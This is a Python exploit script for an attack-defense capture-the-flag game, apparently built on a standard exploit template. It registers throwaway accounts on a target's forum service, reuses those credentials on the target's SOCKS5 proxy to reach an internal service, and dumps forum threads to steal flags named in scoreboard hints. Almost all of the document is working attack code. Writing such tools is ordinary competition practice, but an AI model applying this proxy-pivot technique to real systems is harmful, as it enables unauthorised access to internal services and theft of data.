#!/usr/bin/env python3

import json
import requests
import sys
import threading
import traceback
import string
import random
import time
from python_socks.async_.asyncio import Proxy
import asyncio
import httpx

from typing import Optional

#asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())

TARGET = sys.argv[1] # The target's ip address is passed as an command line argument
service = "premium-forum"

async def exp(thread_id):
    rq = httpx.AsyncClient(base_url=f"http://{TARGET}:9145")
    username: str = "".join(
        random.choices(string.ascii_uppercase + string.digits, k=12)
    )
    password: str = "".join(
        random.choices(string.ascii_uppercase + string.digits, k=12)
    )
    rq.post(
        f"http://{TARGET}:9145/index.php",
        json={"username":username, "password": password},
        headers=[('Connection', 'close')]
    )
    proxy = Proxy.from_url(f"socks5://{username}:{password}@{TARGET}:1080", rdns=True)
    sock = await proxy.connect(service, 1337)
    rd, wr = await asyncio.open_connection(
        host=None,
        port=None,
        sock=sock,
    )
    await rd.readuntil(b"\n>")
    wr.write(f"join {thread_id}\n".encode())
    await wr.drain()
    res = await rd.readuntil(b"\n>")
    wr.write(f"show\n".encode())
    await wr.drain()
    data = await rd.readuntil(b"\n>")
    #print(data.decode())
    print(data)

def exploit(hint: Optional[str], flag_store: Optional[int]):
    print(f'Attacking {TARGET} (flag_store={flag_store}, hint={hint})')
    store = int(flag_store)
    if store == 0:
        #print("one")
        asyncio.run(exp(hint))
    # TODO implement exploit


# Some CTFs publish information ('flag hints') which help you getting individual flags (e.g. the usernames of users that deposited flags).

# Bambi CTF / ENOWARS flag hints:
attack_info = requests.get('http://10.0.13.37:5001/scoreboard/attack.json').json()
service_info = attack_info['services']['onlyflags']
team_info = service_info[TARGET] # Get the information for the current target
threads = []
for round_nr in team_info:
    round_info = team_info[round_nr]
    for flag_store in round_info:
        store_info = round_info[flag_store]
        for flag_info in store_info:
            # flag_info will always be a string, which you might have to parse with json.loads
            t = threading.Thread(target=exploit, args=(flag_info, flag_store))
            t.start()
            threads.append(t)
for thread in threads:
    try:
        thread.join()
    except Exception as e:
        print(e)

# In CTFs that do not publish flag hints you are on your own.
#exploit(None, None)



# Bambixsploit can automatically submit flags to the Bambi CTF / ENOWARS flag submission endpoints only, for other CTFs you have to do it yourself.
'''
# RuCTF / STAY ~ CTF submission
SUBMISSION_ADDRESS = 'http://monitor.ructfe.org/flags'
def submit(flag: str):
    headers={'X-Team-Token': 'TODO_INSERT_SECRET_TOKEN_HERE'}
    data='['+flag+']'
    response = requests.put(SUBMISSION_ADDRESS, headers=headers, data=data)
    print(response)
    print(response.content)
'''

